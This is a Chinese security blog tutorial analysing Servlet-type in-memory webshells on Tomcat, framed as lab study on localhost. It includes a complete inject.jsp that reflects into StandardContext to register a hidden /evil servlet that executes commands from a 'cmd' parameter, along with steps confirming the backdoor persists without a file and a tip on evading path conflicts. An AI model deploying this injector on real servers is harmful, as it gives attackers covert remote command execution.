---
title: 原理分析 | Servlet —— Tomcat 内存马
cover: >-
  https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/4d438cbe94b6b665403e80f0294dcfba.jpg
categories:
  - - 代码审计
    - 内存马
tags:
  - 代码审计
  - Java
  - Tomcat
  - Servlet
  - 内存马
  - RCE
abbrlink: eb030935
date: 2026-04-09 21:10:00
---

#  原理分析 | Servlet —— Tomcat 内存马

> 系列：Tomcat 内存马 —— 继 Filter 型之后，聊聊 Servlet 型的动态注入。

---

## 目录

- [一、Servlet 是如何注册和工作的](#一servlet-是如何注册和工作的)
- [二、Filter 和 Servlet 的区别](#二filter-和-servlet-的区别)
- [三、回顾对比：Filter 型 vs Servlet 型](#三回顾对比filter-型-vs-servlet-型)
- [四、前置知识：Servlet 动态注册 API](#四前置知识servlet-动态注册-api)
- [五、直接调用 addServlet 的问题](#五直接调用-addservlet-的问题)
- [六、Servlet 型内存马注入代码（反射绕过）](#六servlet-型内存马注入代码反射绕过)
- [七、验证步骤](#七验证步骤)
- [八、注意事项](#八注意事项)
- [九、总结](#九总结)

---

## 一、Servlet 是如何注册和工作的

先来看一个最基础的 Servlet 示例，路径：`src/main/java/org/example/filter/EchoServlet.java`

```java
package org.example.filter;

import javax.servlet.ServletException;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;

//@WebServlet(value = "/echo", loadOnStartup = 1)
@WebServlet("/echo")
public class EchoServlet extends HttpServlet {

    @Override
    public void init() throws ServletException {
        System.out.println("EchoServlet 初始化");
    }

    @Override
    protected void doGet(HttpServletRequest req, HttpServletResponse resp)
            throws IOException {
        String msg = req.getParameter("msg");
        resp.setContentType("text/plain;charset=UTF-8");
        resp.getWriter().write("你输入的是：" + msg);
    }

    @Override
    public void destroy() {
        System.out.println("EchoServlet 销毁");
    }
}
```

### 关于 loadOnStartup（懒加载）

`@WebServlet(value = "/echo", loadOnStartup = 1)` 里面有个懒加载的知识点：

- `loadOnStartup` 默认是 `-1`，启用懒加载模式
- 规定 `loadOnStartup >= 0` 时，Tomcat 启动时就会加载这个 Servlet
- 懒加载模式下，只有第一次请求触发时才会初始化 `init()`
- 关闭懒加载后效果和 Filter 一样，**启动服务时就初始化**

> **注意**：动态注册的 Servlet 默认也是懒加载（首次访问时才调用 `init()`），但在内存马场景中，我们通常会在注入后立即主动访问一次后门路径来激活它，因此懒加载并不影响使用。

启动服务后可以看到初始化的打印：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/Servlet_image1.png)

访问 `http://localhost:8080/echo?msg=你好`：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/Servlet_image2.png)

关闭时触发销毁：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/Servlet_image3.png)

---

## 二、Filter 和 Servlet 的区别

Filter 和 Servlet 最大的区别在于：

- **Filter 是"中间拦截器"**，负责预处理和后处理，通过 `chain.doFilter()` 继续传递请求，请求最终要到达 Servlet
- **Servlet 是"终点处理器"**，负责生成最终的响应内容

设置 `@WebServlet("/echo")` 后，访问 `/echo` 就会由这个 Servlet 处理。

如果设置 `@WebServlet("/*")`，那么不管访问 `/xxxx` 什么路径都会由这个 Servlet 处理。比如访问 `http://localhost:8080/asdasd?msg=aaa`：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/Servlet_image4.png)

**依然可以正确显示内容，并没有 404，因为符合通配符规则。**

Servlet 的 `doGet` 方法里没有类似 `chain.doFilter()` 的结尾，因为 **Servlet 就是整条链的终点**：

```
请求 → Filter1.doFilter() → Filter2.doFilter() → Servlet.doGet() → 响应
       ↓ 可截断 return       ↓ 可截断 return       直接输出，无后续
```

### Filter 和 Servlet 在 Java 继承结构上的区别

- `Filter` 实现的是 `javax.servlet.Filter` **接口**
- `Servlet` 继承的是 `javax.servlet.http.HttpServlet` **抽象类**，而 `HttpServlet` 又实现了 `javax.servlet.Servlet` 接口

> 抽象类是 Java 中的一种特殊类，它不能被直接实例化（不能 new），必须被继承后才能使用。**一句话总结**：抽象类就是"不能直接用的模板类"，必须通过继承来补全它缺失的部分。

### 处理方法对比

| 对比项 | Filter | Servlet |
|:---|:---|:---|
| **处理方法数量** | 1 个：`doFilter()` | 多个：`doGet()`、`doPost()`、`doPut()` 等 |
| **是否区分 HTTP 方法** | 不区分（需手动判断） | 自动区分，容器帮调度 |
| **内存马适配** | 无需关心方法 | 通常同时覆盖 GET 和 POST |

### 职责对比

| 对比维度 | Filter | Servlet |
|:---|:---|:---|
| **职责** | 对请求/响应进行**预处理或后处理** | 负责**生成响应内容**（业务逻辑） |
| **链式调用** | 多个 Filter 可形成过滤链，通过 `chain.doFilter()` 传递 | 单个 Servlet 处理一个请求，不存在链 |
| **拦截范围** | 可匹配多个 URL 模式（`/*`、`/admin/*`、`*.jsp`） | 通常映射到具体的路径（`/echo`） |
| **是否必须放行** | 必须调用 `chain.doFilter()` 才能继续 | 处理完毕后直接写回响应，流程结束 |

### 静态 web.xml 写法

在 `src/main/webapp/WEB-INF/web.xml` 中，于 `<web-app>` 标签内添加以下配置：

```xml
<!-- 声明 Servlet：给 Servlet 起个内部名字，并指定它对应的 Java 类 -->
<servlet>
    <servlet-name>echoServlet</servlet-name>
    <servlet-class>org.example.servlet.EchoServlet</servlet-class>
</servlet>

<!-- 映射 Servlet：告诉 Tomcat 这个 Servlet 要处理哪些 URL -->
<servlet-mapping>
    <servlet-name>echoServlet</servlet-name>
    <url-pattern>/echo</url-pattern>
</servlet-mapping>
```

写法和 Filter 的差不多，声明 + 映射两段配置。

---

## 三、回顾对比：Filter 型 vs Servlet 型

在上一篇中，通过反射操作 `StandardContext`，动态注入了一个恶意的 Filter，实现了无文件落地的后门。Filter 型内存马通过拦截所有 URL（`/*`）并检测特定参数来触发命令执行。

本篇介绍另一种同样常用的内存马形态：**Servlet 型**。它的核心思路是：**动态创建一个恶意的 Servlet，并为其映射一个外部可访问的 URL 路径**。由于 Servlet 是专门处理 HTTP 请求的组件，因此这种内存马更像是一个"隐藏的 API 接口"。

| 对比项 | Filter 型 | Servlet 型 |
|:---|:---|:---|
| **注入位置** | 往 `filterDefs`、`filterMaps`、`filterConfigs` 塞数据 | 往 `StandardContext` 的 `children`（Wrapper）中添加 |
| **触发方式** | 任何匹配 `/*` 的请求，带 `?cmd=` 参数时触发 | 访问固定的映射路径（如 `/evil`），可带参数也可不带 |
| **隐蔽性** | 较高，与正常业务混合 | 较低，独立路径容易被扫描发现 |
| **实现难度** | 需要反射操作三个集合（filterDefs、filterMaps、filterConfigs） | 可以直接使用标准 API，几乎无需反射 |

---

## 四、前置知识：Servlet 动态注册 API

这里有个关键差异：

- **Filter 型**：需要反射拿到 `StandardContext`，因为 `ServletContext` 接口没有提供操作 Filter 内部集合的 API。
- **Servlet 型**：也需要拿`StandardContext`弄错了 , 后面有讲。

Servlet 3.0 引入了 `ServletContext` 接口的几个方法：

```java
public ServletRegistration.Dynamic addServlet(String servletName, Servlet servlet);
public ServletRegistration.Dynamic addServlet(String servletName, Class<? extends Servlet> servletClass);
```

| 重载方式 | 参数 | 实例化责任 | 内存马适用性 |
|:---|:---|:---|:---|
| `addServlet(String, Servlet)` | 已创建好的 Servlet 实例 | **你自己 new 好**，直接传入 | ✅ **常用**，因为要用匿名内部类嵌入恶意逻辑 |
| `addServlet(String, Class<? extends Servlet>)` | Servlet 类的 Class 对象 | **Tomcat 负责**通过反射调用 `newInstance()` 创建实例 | ❌ 不常用，无法直接嵌入匿名内部类的命令执行逻辑 |

| 参数 | 含义 |
|:---|:---|
| `servletName` | Servlet 的**内部唯一标识名称**，相当于 `web.xml` 中的 `<servlet-name>` |
| `servlet` | 已经实例化好的 **Servlet 对象** |
| `servletClass` | Servlet 的 Class 对象，容器会通过反射自动创建实例 |

**返回值**：`ServletRegistration.Dynamic` 接口实例，用于进一步配置该 Servlet 的映射路径、初始化参数、加载顺序等。

`ServletRegistration.Dynamic` 提供了 `addMapping(String... urlPatterns)` 方法，用于为 Servlet 指定 URL 映射（等价于 `web.xml` 中 `<servlet-mapping>` 的 `<url-pattern>`）(弄错了 , 这样只能静态添加 , 动态注册仍要反射用`StandardContext`里的方法)：

```java
ServletRegistration.Dynamic dynamic = servletContext.addServlet("evilServlet", evilServlet);
dynamic.addMapping("/evil");
```

---

## 五、直接调用 addServlet 的问题

如果不考虑限制，直接写一个 JSP 调用 `addServlet`：

```jsp
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%@ page import="javax.servlet.*" %>
<%@ page import="javax.servlet.http.*" %>
<%@ page import="java.io.*" %>
<%
    ServletContext servletContext = request.getServletContext();

    Servlet evilServlet = new HttpServlet() {
        @Override
        protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws IOException {
            String cmd = req.getParameter("cmd");
            if (cmd != null) {
                Process process = Runtime.getRuntime().exec(cmd);
                InputStream inputStream = process.getInputStream();
                ByteArrayOutputStream baos = new ByteArrayOutputStream();
                byte[] buffer = new byte[1024];
                int len;
                while ((len = inputStream.read(buffer)) != -1) {
                    baos.write(buffer, 0, len);
                }
                resp.getWriter().write(new String(baos.toByteArray(), "GBK"));
                return;
            }
            resp.getWriter().write("Servlet is running...");
        }

        @Override
        protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws IOException {
            doGet(req, resp);
        }
    };

    ServletRegistration.Dynamic dynamic = servletContext.addServlet("evilServlet", evilServlet);
    dynamic.addMapping("/evil");
    out.println("Servlet 内存马注入成功！访问 /evil?cmd=whoami 测试");
%>
```

访问 `http://localhost:8080/inject.jsp` 后会直接报错：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/Servlet_image5.png)

**报错原因**：这是 **Servlet 规范的限制**——一旦 Web 应用启动完成，`ServletContext` 就进入"已初始化"状态，**禁止再调用 `addServlet()` 动态注册**。

`addServlet()` 方法内部会调用 `checkState()`，判断应用是否已完成初始化，如果已完成则抛出 `IllegalStateException`。

---

## 六、Servlet 型内存马注入代码（反射绕过）

### 解决思路

和 Filter 型一样，用**反射绕过限制**：拿到 `StandardContext`，然后往它的 `children`（一个 `HashMap<String, Container>`）里添加一个 `StandardWrapper` 对象，并配置映射。

完整注入代码 `inject.jsp`：

```jsp
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%@ page import="javax.servlet.*" %>
<%@ page import="javax.servlet.http.*" %>
<%@ page import="java.io.*" %>
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="org.apache.catalina.core.ApplicationContext" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="org.apache.catalina.core.StandardWrapper" %>

<%
// ========== 第一步：反射获取 StandardContext ==========
// 低版本写法：ServletContext servletContext = request.getSession().getServletContext();
ServletContext servletContext = request.getServletContext();

// 和 Filter 一样，需要反射两层获取核心对象 StandardContext

// 1. 获取 ApplicationContext
Field appContextField = servletContext.getClass().getDeclaredField("context");
appContextField.setAccessible(true);
ApplicationContext applicationContext = (ApplicationContext) appContextField.get(servletContext);

// 2. 获取 StandardContext
Field stdContextField = applicationContext.getClass().getDeclaredField("context");
stdContextField.setAccessible(true);
StandardContext standardContext = (StandardContext) stdContextField.get(applicationContext);

// 拿到 StandardContext 后，后续操作调用的都是其公开方法（addChild、addServletMappingDecoded），无需再次动用反射。

// ========== 第二步：定义恶意 Servlet（匿名内部类） ==========
// 通过匿名内部类的方式，直接继承抽象类 HttpServlet 并重写 doGet 和 doPost 方法
// 无需单独编写 .java 文件
Servlet evilServlet = new HttpServlet() {

    @Override
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws IOException {
        // 获取请求参数 cmd
        String cmd = req.getParameter("cmd");
        if (cmd != null) {
            // 调用系统命令
            Process process = Runtime.getRuntime().exec(cmd);
            // 把结果输出到网页
            InputStream inputStream = process.getInputStream();
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            byte[] buffer = new byte[1024];
            int len;
            while ((len = inputStream.read(buffer)) != -1) {
                baos.write(buffer, 0, len);
            }
            resp.getWriter().write(new String(baos.toByteArray(), "GBK"));
            return;
        }
        resp.getWriter().write("Servlet is running...");
    }

    @Override
    // doPost 直接调用 doGet，确保 GET/POST 都能触发命令执行
    protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws IOException {
        doGet(req, resp);
    }
};

// 为什么 Servlet 不用写 init 和 destroy？
// 因为 HttpServlet 是抽象类，它已经为 init() 和 destroy() 提供了默认的空实现，不写也不会报错。

// 为什么 Filter 必须写 init 和 destroy？
// 因为 Filter 是接口，接口中所有方法都是抽象的，没有方法体。
// 必须把三个方法全部实现，哪怕不需要也得写上空的大括号 {}，否则编译不通过。

// ========== 第三步：通过 StandardContext 注册 Servlet ==========

// 1. 创建 StandardWrapper 包装 Servlet
// 在 Tomcat 内部，每一个 Servlet 都不是直接裸露的，而是被一个 StandardWrapper 对象包装起来
// 类似 Filter 里的 FilterDef 存储 Filter 的元信息（名称、类名、实例引用）
// 需要先包装后才能传入 StandardContext
// 而传入的方法可以直接用 addChild（因为是 public 的）
StandardWrapper wrapper = new StandardWrapper();
wrapper.setName("evilServlet");             // 标识
wrapper.setServlet(evilServlet);            // 直接设置实例
wrapper.setServletClass(evilServlet.getClass().getName()); // 设置类名（可选）

// 2. 将 Wrapper 添加到 StandardContext 的子容器中
standardContext.addChild(wrapper);

// 3. 添加 URL 映射
// 关于 addServletMappingDecoded：
// 在 Tomcat 9 中，旧版的 addServletMapping 已被废弃并移除，取而代之的是 addServletMappingDecoded。
// 带 Decoded 后缀的方法会对 URL 路径进行百分号解码处理，避免双重编码问题。
// 它是 StandardContext 的 public 方法，直接调用即可。
standardContext.addServletMappingDecoded("/evil", "evilServlet");

out.println("Servlet 内存马注入成功（反射方式）！访问 /evil?cmd=whoami 测试");
%>
```

### 代码结构梳理

整个注入流程可以拆成三步：

1. **反射两层**，从 `ServletContext` 挖到 `StandardContext`（和 Filter 型一模一样）
2. **匿名内部类**定义恶意 Servlet，重写 `doGet`/`doPost`，嵌入命令执行逻辑
3. **StandardWrapper 包装** → `addChild` 注册 → `addServletMappingDecoded` 映射路径

和 Filter 型对比，Servlet 型少了操作 `filterMaps`、`filterConfigs` 那一套，整体更简洁。

---

## 七、验证步骤

**1. 准备环境**：确保 Tomcat 正在运行，且存在一个 Web 应用（比如之前的 Filter 项目）。

**2. 上传 `injectServlet.jsp`**：将该 JSP 文件放到 Web 应用的根目录（如 `webapp/injectServlet.jsp`）。

**3. 访问注入页面**：浏览器访问 `http://localhost:8080/injectServlet.jsp`，页面显示"注入成功"。

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/Servlet_image6.png)

**4. 测试后门**：访问 `http://localhost:8080/evil?cmd=whoami`，看到命令执行结果。

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/Servlet_image7.png)

**5. 验证无文件落地**：删除 `injectServlet.jsp` 文件，再次访问 `http://localhost:8080/injectServlet.jsp` 显示 404：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/Servlet_image8.png)

再次访问 `/evil?cmd=calc`，仍然有效：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/Servlet_image9.png)

**6. 重启验证**：重启 Tomcat 后直接访问 `/evil?cmd=whoami`，显示 404 或首页，说明内存马已消失（内存已释放）：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/Servlet_image10.png)

---

## 八、注意事项

### 1. 路径冲突问题

如果目标应用本身已经有一个名为 `evilServlet` 的 Servlet，或存在 `/evil` 的映射，`addServlet` 或 `addMapping` 会抛出异常。在实际渗透中，攻击者通常会使用随机字符串（如 UUID）作为名称和路径，避免冲突。

### 2. 与 Filter 型的适用场景

- **Filter 型**：适合"通杀"所有请求，隐蔽性好，但需要较多反射代码。
- **Servlet 型**：适合需要独立 API 接口的场景，实现简单，但路径固定，容易被扫描器发现。

### 3. 安全配置的影响

如果目标应用使用了 `SecurityManager` 或 Tomcat 的 `security-constraint` 限制了对特定路径的访问，注入的 Servlet 也可能受到限制。

---

## 九、总结

Servlet 型内存马整体比 Filter 型**简单**，核心流程：

1. 反射两层拿 `StandardContext`（和 Filter 型相同）
2. 匿名内部类写恶意 Servlet，`doPost` 转发给 `doGet`
3. `StandardWrapper` 包装实例 → `addChild` → `addServletMappingDecoded` 完成注册

不需要操作三个集合，也不需要手动操作 `filterConfigs`，整体代码量少了不少。

但相比 Filter 型，**隐蔽性较差**：Filter 挂载在 `/*` 上，混在正常业务流量里；Servlet 需要独立路径，容易被安全扫描器或流量分析发现。

下一篇：**Listener 型内存马**——它无需映射任何 URL，却能监听所有请求，是目前隐蔽性最强的一种形式。

---

> 参考环境：Tomcat 9、JDK 8u65、Servlet 3.0+
